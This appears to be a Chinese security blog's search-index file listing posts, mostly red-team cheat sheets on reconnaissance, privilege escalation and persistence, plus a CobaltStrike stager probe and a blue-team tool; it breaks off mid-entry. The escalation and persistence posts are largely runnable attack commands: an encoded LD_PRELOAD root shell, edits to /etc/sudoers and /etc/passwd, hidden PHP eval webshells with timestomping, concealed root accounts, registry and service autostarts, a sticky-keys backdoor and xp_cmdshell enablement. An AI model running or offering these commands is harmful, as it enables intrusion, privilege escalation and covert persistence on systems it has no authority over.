<?xml version="1.0" encoding="utf-8"?> <search><entry><title>MarkHacker</title><link href="/writings/MarkHacker/"/><url>/writings/MarkHacker/</url><content type="html"><![CDATA[<h2 id="基本描述"><a href="#基本描述" class="headerlink" title="基本描述"></a>基本描述</h2><blockquote><p><em>通过请求资源文件判断客户端使用的Hacker工具&nbsp;&nbsp;–&gt;&nbsp;&nbsp;<a href="https://donghuangt1.com/MarkHacker">在线地址</a></em></p></blockquote><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><ul><li>回调函数</li></ul><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;DongHuangT1&#x2F;MarkHacker&#x2F;mark.js&quot; call&#x3D;&quot;Callback&quot;&gt;&lt;&#x2F;script&gt;</code></pre><ul><li>HTTP请求</li></ul><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;DongHuangT1&#x2F;MarkHacker&#x2F;mark.js&quot; call&#x3D;&quot;http:&#x2F;&#x2F;***&quot;&gt;&lt;&#x2F;script&gt;</code></pre><h2 id="演示截图"><a href="#演示截图" class="headerlink" title="演示截图"></a>演示截图</h2><p><img src="https://ik.imagekit.io/DongHuangT1/MarkHacker/MarkHacker-01.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/MarkHacker/MarkHacker-02.jpg"></p>]]></content><categories><category>推荐</category></categories><tags><tag>BlueTeam</tag></tags></entry><entry><title>CS新特征</title><link href="/writings/Stager/"/><url>/writings/Stager/</url><content type="html"><![CDATA[<h2 id="基本描述"><a href="#基本描述" class="headerlink" title="基本描述"></a>基本描述</h2><blockquote><p><em>CobaltStrike的HTTP(S)监听器对请求URL未进行”/“开头验证，攻击者可通过指定URL获取相关信息。</em></p></blockquote><h2 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h2><pre class="line-numbers language-none"><code class="language-none">GET stager HTTP&#x2F;1.1Host: x.x.x.xUser-Agent: Mozilla&#x2F;5.0</code></pre><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-01.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-02.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-03.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-04.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-05.jpg"></p><p><img src="https://ik.imagekit.io/DongHuangT1/Stager/Stager-06.jpg"></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p><code>CobaltStrike &lt;= 4.5</code></p>]]></content><categories><category>安全</category></categories><tags><tag>BlueTeam</tag></tags></entry><entry><title>信息收集</title><link href="/writings/RedTeam-1/"/><url>/writings/RedTeam-1/</url><content type="html"><![CDATA[<h2 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li><a href="https://www.qcc.com/">https://www.qcc.com</a></li><li><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com</a></li><li><a href="https://www.tianyancha.com/">https://www.tianyancha.com</a></li></ul><h3 id="供应商"><a href="#供应商" class="headerlink" title="供应商"></a>供应商</h3><ul><li><a href="https://t.qcc.com/home">https://t.qcc.com/home</a></li><li><a href="https://www.jrzb001.com/">https://www.jrzb001.com</a></li></ul><h2 id="域名资产"><a href="#域名资产" class="headerlink" title="域名资产"></a>域名资产</h2><h3 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h3><ul><li><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></li><li><a href="https://whois.aliyun.com/">https://whois.aliyun.com</a></li><li><a href="https://whois.aizhan.com/">https://whois.aizhan.com</a></li></ul><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ul><li>在线查询</li></ul><pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">https:&#x2F;&#x2F;crt.shhttps:&#x2F;&#x2F;chaziyu.comhttps:&#x2F;&#x2F;www.dnsscan.cnhttps:&#x2F;&#x2F;dnsdumpster.comhttps:&#x2F;&#x2F;phpinfo.me&#x2F;domainhttps:&#x2F;&#x2F;rapiddns.io&#x2F;subdomainhttps:&#x2F;&#x2F;searchdns.netcraft.comhttps:&#x2F;&#x2F;dns.bufferover.run&#x2F;dns?q&#x3D;</code></pre><ul><li><a href="https://github.com/projectdiscovery/subfinder">subfinder</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cat target.txt | subfinder -nW -all -silent -o domain.txt</code></pre><h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><ul><li><a href="https://chapangzhan.com/">https://chapangzhan.com</a></li><li><a href="https://rapiddns.io/sameip">https://rapiddns.io/sameip</a></li><li><a href="https://stool.chinaz.com/same">https://stool.chinaz.com/same</a></li><li><a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></li></ul><h3 id="备案查询"><a href="#备案查询" class="headerlink" title="备案查询"></a>备案查询</h3><ul><li><a href="http://www.beian.gov.cn/">http://www.beian.gov.cn</a></li><li><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn</a></li></ul><h2 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>在线扫描</li></ul><pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">https:&#x2F;&#x2F;www.aicesu.cn&#x2F;porthttps:&#x2F;&#x2F;portscanner.standingtech.comhttps:&#x2F;&#x2F;www.ipfingerprints.com&#x2F;portscan.php</code></pre><ul><li><a href="https://github.com/projectdiscovery/naabu">naabu</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cat target.txt | naabu -p 22,23,80,135,443,389,445,873,1090,1099,1433,1521,2375,3306,3389,5432,5900,5985,6379,7001,7002,8000-9000,9200 -ping -stats -silent -retries 1 -o port.txt</code></pre><h2 id="应用服务"><a href="#应用服务" class="headerlink" title="应用服务"></a>应用服务</h2><h3 id="Web指纹"><a href="#Web指纹" class="headerlink" title="Web指纹"></a>Web指纹</h3><ul><li>在线查询</li></ul><pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">https:&#x2F;&#x2F;whatcms.orghttps:&#x2F;&#x2F;www.yunsee.cnhttps:&#x2F;&#x2F;www.godeye.viphttps:&#x2F;&#x2F;fp.shuziguanxing.com</code></pre><ul><li><a href="https://github.com/projectdiscovery/httpx">httpx</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cat target.txt | httpx -sc -td -fr -nc -title -silent -o url.txt</code></pre><ul><li><p>浏览器插件</p><p><a href="https://www.wappalyzer.com/download/">Wapplyzer</a>、<a href="https://www.whatruns.com/downloads/">WhatRuns</a></p></li></ul><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">wafw00f http:&#x2F;&#x2F;example.com</code></pre><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><ul><li><a href="https://github.com/OJ/gobuster">gobuster</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">gobuster dir -u https:&#x2F;&#x2F;example.com -w dict.txt -k --random-agent</code></pre><h3 id="APP-公众号"><a href="#APP-公众号" class="headerlink" title="APP/公众号"></a>APP/公众号</h3><ul><li><a href="https://www.qimai.cn/">https://www.qimai.cn</a></li><li><a href="https://play.google.com/">https://play.google.com</a></li><li><a href="https://weixin.sogou.com/">https://weixin.sogou.com</a></li><li><a href="https://www.tianyancha.com/">https://www.tianyancha.com</a></li></ul><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell"></code></pre><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell"></code></pre><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">site:example.com intitle:管理|后台|登录|系统|测试site:example.com filetype:doc|xls|sql|log|conf|jsonsite:example.com intext:*mail|Powered|Password|默认密码site:example.com inurl:admin|login|system|upload|editor</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>漏洞利用</title><link href="/writings/RedTeam-2/"/><url>/writings/RedTeam-2/</url><content type="html"><![CDATA[]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>系统提权</title><link href="/writings/RedTeam-3/"/><url>/writings/RedTeam-3/</url><content type="html"><![CDATA[<h2 id="系统内核"><a href="#系统内核" class="headerlink" title="系统内核"></a>系统内核</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><a href="https://github.com/Al1ex/LinuxEelvation">Linux</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">uname -a &amp;&amp; cat &#x2F;etc&#x2F;*-release</code></pre><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><a href="https://github.com/Ascotbe/Kernelhub">Windows</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquansysteminfo | findstr &quot;OS KB&quot;</code></pre><h2 id="错误配置"><a href="#错误配置" class="headerlink" title="错误配置"></a>错误配置</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><ul><li><a href="https://gtfobins.github.io/#+SUDO">SUDO</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#NOPASSWDsudo -l#LD_PRELOADecho I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgp2b2lkIF9pbml0KCkgewoJdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsKCXNldGdpZCgwKTsKCXNldHVpZCgwKTsKCXN5c3RlbSgiL2Jpbi9zaCIpOwp9 | base64 -d &gt; &#x2F;tmp&#x2F;shell.c &amp;&amp; gcc -fPIC -shared -nostartfiles &#x2F;tmp&#x2F;shell.c -o &#x2F;tmp&#x2F;shell.sosudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so &lt;COMMAND&gt;#CVE-2019-14287 &amp;&amp; (ALL, !root)sudo -u#-1 &lt;COMMAND&gt;sudo -u#4294967295 &lt;COMMAND&gt;</code></pre><ul><li><a href="https://gtfobins.github.io/#+SUID">SUID</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre><ul><li>RPATH</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">readelf -d *** | egrep &quot;NEEDED|RPATH&quot;</code></pre><ul><li>Crontab</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">crontab -lls -al &#x2F;etc&#x2F;cron*ls -al &#x2F;var&#x2F;spool&#x2F;cron&#x2F;*</code></pre><ul><li>Writable</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#查找可写文件find &#x2F; -writable ! -user &quot;$(whoami)&quot; ! -path &quot;&#x2F;sys&#x2F;*&quot; ! -path &quot;&#x2F;proc&#x2F;*&quot; -type f -exec ls -la &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null#&#x2F;etc&#x2F;sudoersecho &quot;user ALL&#x3D;(ALL) NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers#&#x2F;etc&#x2F;passwdecho &quot;user:$(openssl passwd -1 admin@888..):0:0:user:&#x2F;:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</code></pre><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><ul><li>ServicePermission</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</code></pre><ul><li>TrustedServicePath</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">use exploit&#x2F;windows&#x2F;local&#x2F;unquoted_service_path</code></pre><ul><li>AlwaysInstallElevated</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</code></pre><h2 id="应用服务"><a href="#应用服务" class="headerlink" title="应用服务"></a>应用服务</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><ul><li>NFS</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#&#x2F;etc&#x2F;exports &amp;&amp; no_root_squashshowmount -e x.x.x.xmount -t nfs x.x.x.x:&#x2F;yyyy &#x2F;mntcd &#x2F;mnt &amp;&amp; cp &#x2F;bin&#x2F;bash . &amp;&amp; chmod u+s bash</code></pre><ul><li>MySQL</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">sqlmap -d &quot;mysql:&#x2F;&#x2F;user:passwd@host:3306&#x2F;mysql&quot; --os-shell</code></pre><ul><li>Docker</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">docker run -it --rm -v &#x2F;:&#x2F;host alpinecd &#x2F;host&#x2F;tmp &amp;&amp; cp &#x2F;host&#x2F;bin&#x2F;bash . &amp;&amp; chmod u+s bash</code></pre><h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><ul><li>MySQL</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">&#x2F;* 查看版本 *&#x2F;select version();&#x2F;* 读写文件(NULL&#x3D;&gt;禁止, 空&#x3D;&gt;允许) *&#x2F;show variables like &quot;secure_file_priv&quot;;&#x2F;* 插件目录 *&#x2F;show variables like &quot;%plugin%&quot;;&#x2F;* UDF &amp;&amp; MySQL&lt;5.1 (C:&#x2F;Windows&#x2F;System32&#x2F;), MySQL&gt;5.1 (MySQL&#x2F;lib&#x2F;plugin&#x2F;) *&#x2F;select 0x4d5a900... into dumpfile &quot;***&quot;;create function sys_eval returns string soname &quot;UDF.dll&quot;;select sys_eval(&quot;whoami&quot;);drop function sys_eval;&#x2F;* MOF &amp;&amp; Windows&lt;&#x3D;2003 *&#x2F;use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</code></pre><ul><li>MSSQL</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">&#x2F;* xp_cmdshell *&#x2F;exec sp_configure &#39;show advanced options&#39;, 1; reconfigure;exec sp_configure &#39;xp_cmdshell&#39;, 1; reconfigure;exec master..xp_cmdshell &#39;whoami&#39;;&#x2F;* sp_oacreate *&#x2F;exec sp_configure &#39;show advanced options&#39;, 1; reconfigure;exec sp_configure &#39;Ole Automation Procedures&#39;, 1; reconfigure;declare @shell int exec sp_oacreate &#39;wscript.shell&#39;, @shell output exec sp_oamethod @shell, &#39;run&#39;, null, &#39;C:\Windows\System32\cmd.exe &#x2F;c whoami&#39;</code></pre><h2 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h2><h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><ul><li><a href="https://github.com/nongiach/sudo_inject">Sudo_Inject</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope &#x3D;&#x3D; 0for PID in $(pgrep &quot;^(bash|dash|sh|zsh)$&quot; -u $(id -u)); do echo &quot;call system(\&quot;echo | sudo -S chmod +s &#x2F;bin&#x2F;sh &amp;&gt;&#x2F;dev&#x2F;null\&quot;)&quot; | gdb -q -n -p $PID &amp;&gt;&#x2F;dev&#x2F;null; done</code></pre><h3 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h3><ul><li>Meterpreter</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">use incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></pre><ul><li><a href="https://github.com/CCob/SweetPotato">SweetPotato</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">SweetPotato.exe -e PrintSpoofer -a &quot;whoami&quot;</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>权限维持</title><link href="/writings/RedTeam-4/"/><url>/writings/RedTeam-4/</url><content type="html"><![CDATA[<h2 id="隐匿文件"><a href="#隐匿文件" class="headerlink" title="隐匿文件"></a>隐匿文件</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内容隐藏</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">printf &quot;&lt;?&#x3D;@eval(\$_REQUEST[&#39;code&#39;]);?&gt;\r%-50s\n&quot; &gt; backup.php</code></pre><ul><li>文件时间</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">touch -r index.php backup.phptouch -t 201406121017.34 backup.php</code></pre><ul><li>文件锁定</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">chattr +i backup.php</code></pre><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>文件隐藏</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">attrib +s +a +h +r D:\PHPStudy\WWW\backup.php</code></pre><ul><li>ADS隐藏</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#XP之后ADS文件无执行权限echo ^&lt;?&#x3D;@eval($_REQUEST[&#39;code&#39;]);?^&gt; &gt; index.php:mm</code></pre><ul><li>文件时间</li></ul><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">(ls backup.php).CreationTime&#x3D;&quot;2014-06-12 10:17:34&quot;(ls backup.php).LastWriteTime&#x3D;&quot;2014-06-12 10:17:34&quot;(ls backup.php).LastAccessTime&#x3D;&quot;2014-06-12 10:17:34&quot;</code></pre><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><ul><li>普通账户</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cp &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;nologin &amp;&amp; chmod u+s &#x2F;bin&#x2F;nologinsed -i &quot;17i\usr:x:40:40:usr:&#x2F;usr&#x2F;sbin:&#x2F;bin&#x2F;nologin&quot; &#x2F;etc&#x2F;passwdsed -i &quot;17i\usr:$(openssl passwd -1 admin@888..):18375:0:99999:7:::&quot; &#x2F;etc&#x2F;shadow</code></pre><ul><li>系统账户</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">ln -s &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;nologinsed -i &quot;3i\usr:x:0:0:usr:&#x2F;usr&#x2F;sbin:&#x2F;bin&#x2F;nologin&quot; &#x2F;etc&#x2F;passwdsed -i &quot;3i\usr:$(openssl passwd -1 admin@888..):18375:0:99999:7:::&quot; &#x2F;etc&#x2F;shadow</code></pre><ul><li>密钥登录</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">ln -s &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;nologin &amp;&amp; setcap cap_setuid+ep &#x2F;bin&#x2F;pythonsed -i &quot;17i\usr:x:40:40:usr:&#x2F;var&#x2F;local:&#x2F;bin&#x2F;nologin&quot; &#x2F;etc&#x2F;passwdsed -i &quot;17i\usr:*:18375:0:99999:7:::&quot; &#x2F;etc&#x2F;shadowmkdir &#x2F;var&#x2F;local&#x2F;.ssh &amp;&amp; echo &quot;***&quot; &gt; &#x2F;var&#x2F;local&#x2F;.ssh&#x2F;authorized_keyspython -c &quot;import os, pty; os.setuid(0); pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</code></pre><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><ul><li>来宾账户</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">net user guest admin@888..net user guest &#x2F;active:yesnet localgroup administrators guest &#x2F;add</code></pre><ul><li>VBS 脚本</li></ul><pre class="line-numbers language-VBNet" data-language="VBNet"><code class="language-VBNet">UserName &#x3D; WScript.Arguments(0)PassWord &#x3D; WScript.Arguments(1)WinNT &#x3D; &quot;WinNT:&#x2F;&#x2F;&quot; &amp; CreateObject(&quot;WScript.Network&quot;).ComputerNameSet Admin &#x3D; GetObject(WinNT &amp; &quot;&#x2F;Administrators, Group&quot;)If UCase(UserName) &#x3D; &quot;GUEST&quot; ThenSet User &#x3D; GetObject(WinNT &amp; &quot;&#x2F;Guest&quot;)User.AccountDisabled &#x3D; FALSEElseSet User &#x3D; GetObject(WinNT).Create(&quot;User&quot;, UserName)End IfUser.SetPassword PassWordUser.SetInfoAdmin.add WinNT &amp; &quot;&#x2F;&quot; &amp; UserName</code></pre><h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><ul><li>启动脚本</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">&#x2F;etc&#x2F;bashrc&#x2F;etc&#x2F;profile&#x2F;etc&#x2F;profile.d&#x2F;*&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;*&#x2F;etc&#x2F;rc.d&#x2F;rc.local</code></pre><ul><li>计划任务</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">sed -i &quot;\$i\\$(printf &#39;59 23 * * * root 执行命令 &amp;&gt; &#x2F;dev&#x2F;null\r%-80s\n&#39;)&quot; &#x2F;etc&#x2F;crontab#&#x2F;etc&#x2F;cron.hourly--时, &#x2F;etc&#x2F;cron.daily--天, &#x2F;etc&#x2F;cron.weekly--周, &#x2F;etc&#x2F;cron.monthly--月printf &quot;执行命令 &amp;&gt; &#x2F;dev&#x2F;null\r%-60s\n&quot; &gt; &#x2F;etc&#x2F;cron.daily&#x2F;文件名 &amp;&amp; chmod 755 &#x2F;etc&#x2F;cron.daily&#x2F;文件名</code></pre><h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><ul><li>注册表</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v 键名 &#x2F;t REG_SZ &#x2F;d &quot;执行命令&quot; &#x2F;freg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v 键名 &#x2F;t REG_SZ &#x2F;d &quot;执行命令&quot; &#x2F;freg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; &#x2F;v 键名 &#x2F;t REG_SZ &#x2F;d &quot;执行命令&quot; &#x2F;freg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; &#x2F;v 键名 &#x2F;t REG_SZ &#x2F;d &quot;执行命令&quot; &#x2F;f</code></pre><ul><li>登录脚本</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">reg add &quot;HKCU\Environment&quot; &#x2F;v UserInitMprLogonScript &#x2F;t REG_SZ &#x2F;d &quot;程序路径&quot; &#x2F;freg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Shell &#x2F;t REG_SZ &#x2F;d &quot;explorer.exe,执行命令&quot; &#x2F;freg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Userinit &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\System32\userinit.exe,执行命令&quot; &#x2F;f</code></pre><ul><li>启动目录</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#NT6以前C:\Documents and Settings\All Users\Start Menu\Programs\StartUpC:\Documents and Settings\%UserName%\Start Menu\Programs\StartUp#NT6以后C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUpC:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><ul><li>系统服务</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">sc create 服务名称 binPath&#x3D; &quot;执行命令&quot; start&#x3D; &quot;delayed-auto&quot; obj&#x3D; &quot;LocalSystem&quot;sc description 服务名称 &quot;服务描述内容&quot;</code></pre><ul><li>计划任务</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#onStart--系统启动时, onLogon--用户登录时schtasks &#x2F;Create &#x2F;tn &quot;\Microsoft\Windows\任务名称\任务名称&quot; &#x2F;ru SYSTEM &#x2F;sc onStart &#x2F;tr &quot;执行命令&quot;</code></pre><h2 id="进程劫持"><a href="#进程劫持" class="headerlink" title="进程劫持"></a>进程劫持</h2><h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><ul><li>alias后门</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">printf &quot;alias pwd&#x3D;&#39;\$(执行命令 &amp;&gt; &#x2F;dev&#x2F;null)pwd&#39;\r%-80s\n&quot; &gt;&gt; ~&#x2F;.bashrc &amp;&amp; source ~&#x2F;.bashrc</code></pre><h3 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>DLL劫持</p></li><li><p>文件替换</p></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">takeown &#x2F;A &#x2F;F C:\Windows\System32\sethc.execacls C:\Windows\System32\sethc.exe &#x2F;E &#x2F;G Everyone:Fcd C:\Windows\System32 &amp;&amp; move sethc.exe sethc.bak &amp;&amp; copy odbcad32.exe sethc.exe</code></pre><ul><li>映像劫持</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#直接触发执行reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\System32\odbcad32.exe&quot; &#x2F;f#静默退出执行reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;freg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v MonitorProcess &#x2F;t REG_SZ &#x2F;d &quot;执行命令&quot; &#x2F;freg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512 &#x2F;f</code></pre><h2 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h2><h3 id="Linux-4"><a href="#Linux-4" class="headerlink" title="Linux"></a>Linux</h3><ul><li>Iptables</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#x.x.x.x --&gt; Server:80 --&gt; x.x.x.x:22iptables -t nat -A PREROUTING -p tcp -s x.x.x.x --dport 80 -j DNAT --to x.x.x.x:22</code></pre><h3 id="Windows-4"><a href="#Windows-4" class="headerlink" title="Windows"></a>Windows</h3><ul><li>WinRM</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#启动WinRMwinrm quickconfig ‐q#启用端口复用winrm set winrm&#x2F;config&#x2F;Service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125;#更改监听端口winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125;#设置信任连接winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>流量隧道</title><link href="/writings/RedTeam-5/"/><url>/writings/RedTeam-5/</url><content type="html"><![CDATA[<h2 id="TCP隧道"><a href="#TCP隧道" class="headerlink" title="TCP隧道"></a>TCP隧道</h2><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a><a 